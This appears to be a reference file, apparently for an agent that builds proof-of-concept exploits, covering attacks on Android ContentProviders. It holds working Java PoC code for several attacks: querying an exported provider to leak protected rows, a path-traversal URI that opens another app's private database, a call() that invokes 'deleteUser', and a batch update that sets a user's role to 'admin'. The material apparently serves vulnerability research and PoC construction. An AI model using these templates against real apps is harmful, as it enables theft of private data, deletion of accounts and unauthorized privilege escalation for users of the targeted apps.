---
name: poc-app-provider
description: Provider PoC reference covering data exposure, SQL injection, path traversal, custom call methods, batch abuse, getType oracles, and FileProvider misconfiguration.
---

# Provider PoC Reference

Exported or grant-reachable `ContentProvider` attack paths. Usually `direct-trigger`, with `returned-handle` for grant-based FileProvider chains.

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---|---|---|---|
| data leak | `direct-trigger` | none | protected rows become readable |
| SQL injection | `direct-trigger` | none | query semantics change, protected data returned |
| path traversal | `direct-trigger` | none | attacker-controlled path accepted by file APIs |
| `call()` exposure | `direct-trigger` | none | custom method executes or returns sensitive data |
| batch abuse | `direct-trigger` | none | unauthorized insert/update/delete succeeds |
| `getType()` oracle | probe `direct-trigger` | none | existence or state leak observed |
| FileProvider misconfig | `returned-handle` or `direct-trigger` | none | private file URI becomes readable |

## Shared Inputs

Victim provider authority and path, attacker-controlled query args/URI segments/method name/batch body, whether the path is direct-open or grant-reuse, visible success signal.

## Pattern 1 - Query-Based Read Or Injection

For data leaks and SQL injection.

```java
private static void runProviderQueryLeak(Context context) {
    Uri uri = Uri.parse("content://com.target.provider/users");
    try (Cursor cursor = context.getContentResolver().query(uri, null, null, null, null)) {
        if (cursor != null) {
            Log.i("PoC", "Returned rows: " + cursor.getCount());
        } else {
            Log.i("PoC", "Query returned null cursor");
        }
    } catch (Exception e) {
        Log.e("PoC", "Query failed", e);
    }
}
```

```java
static {
    register("provider-query", "Query Exported Provider", () -> runProviderQueryLeak(appContext));
}
```

SQL injection variant: replace `selection`, `selectionArgs`, or `sortOrder` with the verified injection point.

## Pattern 2 - File Or Path Access

For traversal and FileProvider cases.

```java
private static void runProviderPathTraversal(Context context) {
    Uri uri = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
    try (ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r")) {
        if (pfd != null) {
            Log.i("PoC", "openFileDescriptor() accepted traversal URI");
        } else {
            Log.i("PoC", "File descriptor was null");
        }
    } catch (Exception e) {
        Log.e("PoC", "openFileDescriptor() failed", e);
    }
}
```

```java
static {
    register("provider-file", "Open Provider File Path", () -> runProviderPathTraversal(appContext));
}
```

## Pattern 3 - Custom `call()` Or Batch Abuse

For custom method exposure or unauthorized writes.

```java
private static void runProviderCallExpose(Context context) {
    Uri uri = Uri.parse("content://com.target.provider");
    Bundle extras = new Bundle();
    extras.putString("user_id", "1");
    try {
        Bundle result = context.getContentResolver().call(uri, "deleteUser", null, extras);
        Log.i("PoC", "call() returned: " + result);
    } catch (Exception e) {
        Log.e("PoC", "call() failed", e);
    }
}
```

```java
private static void runProviderBatchAbuse(Context context) {
    Uri uri = Uri.parse("content://com.target.provider/users");
    ArrayList<ContentProviderOperation> ops = new ArrayList<>();
    ContentValues values = new ContentValues();
    values.put("role", "admin");
    ops.add(ContentProviderOperation.newUpdate(uri)
        .withSelection("user_id=?", new String[]{"10001"})
        .withValues(values).build());

    try {
        ContentProviderResult[] results = context.getContentResolver().applyBatch("com.target.provider", ops);
        Log.i("PoC", "applyBatch() result count: " + results.length);
    } catch (Exception e) {
        Log.e("PoC", "applyBatch() failed", e);
    }
}
```

```java
static {
    register("provider-call", "Invoke Provider call()", () -> runProviderCallExpose(appContext));
    register("provider-batch", "Apply Provider Batch", () -> runProviderBatchAbuse(appContext));
}
```

## Pattern 4 - Oracle Or Grant-Oriented

`getType()` is usually a supporting probe, not the primary PoC. FileProvider paths may be demonstrated by directly opening the misconfigured URI or reusing a returned grant-bearing URI.
